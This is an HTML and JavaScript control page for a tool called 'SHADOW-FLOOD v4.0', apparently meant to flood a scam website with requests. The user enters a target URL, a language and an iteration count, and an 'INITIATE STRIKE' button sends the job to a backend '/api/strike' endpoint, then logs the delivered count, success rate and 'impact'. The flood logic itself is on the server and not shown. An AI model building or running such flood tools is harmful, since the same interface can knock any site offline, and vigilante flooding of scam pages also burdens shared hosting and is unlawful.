<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SHADOW-FLOOD v4.0</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        input, select { width: 100%; padding: 10px; margin: 5px 0; background: #111; color: #0f0; border: 1px solid #0f0; }
        button { background: #f00; color: #fff; padding: 15px; width: 100%; font-size: 18px; border: none; margin-top: 10px; }
        .log { margin-top: 20px; font-size: 12px; background: #111; padding: 10px; max-height: 300px; overflow-y: auto; }
        .success { color: #0f0; }
        .error { color: #f00; }
        .warning { color: #ff0; }
    </style>
</head>
<body>
    <h2>ðŸ’€ SHADOW-FLOOD v4.0 ðŸ”¥</h2>
    <div style="color:#f00;font-size:12px;margin-bottom:10px;">HTTP DIRECT FLOOD MODE</div>
    
    <input type="url" id="url" placeholder="Scam URL" value="https://safety-request-appeal-now.surge.sh/">
    
    <select id="lang">
        <option value="English">English</option>
        <option value="Hindi">Hindi</option>
        <option value="Spanish">Spanish</option>
        <option value="Portuguese">Portuguese</option>
        <option value="Tamil">Tamil</option>
        <option value="Arabic">Arabic</option>
        <option value="French">French</option>
        <option value="Vietnamese">Vietnamese</option>
    </select>
    
    <input type="number" id="count" value="100" placeholder="Iterations (max 200)">
    
    <button onclick="strike()">âš¡ INITIATE STRIKE âš¡</button>
    
    <div class="log" id="log"></div>

    <script>
        function log(msg, type='info') {
            const div = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            div.innerHTML += `<div class="${type}">[${time}] ${msg}</div>`;
            div.scrollTop = div.scrollHeight;
        }

        async function strike() {
            const url = document.getElementById('url').value;
            const lang = document.getElementById('lang').value;
            const count = document.getElementById('count').value;
            
            log('Initializing HTTP flood...', 'warning');
            
            try {
                const res = await fetch(`/api/strike?url=${encodeURIComponent(url)}&iterations=${count}&lang=${lang}`);
                const data = await res.json();
                
                if (data.error) {
                    log(`Error: ${data.error}`, 'error');
                    return;
                }
                
                log(`âœ… STRIKE COMPLETE`, 'success');
                log(`Delivered: ${data.successful}/${data.requested}`, 'success');
                log(`Success Rate: ${data.success_rate}`, 'success');
                log(`Impact: ${data.impact}`, 'success');
                
            } catch (e) {
                log(`Failed: ${e.message}`, 'error');
            }
        }
    </script>
</body>
</html>
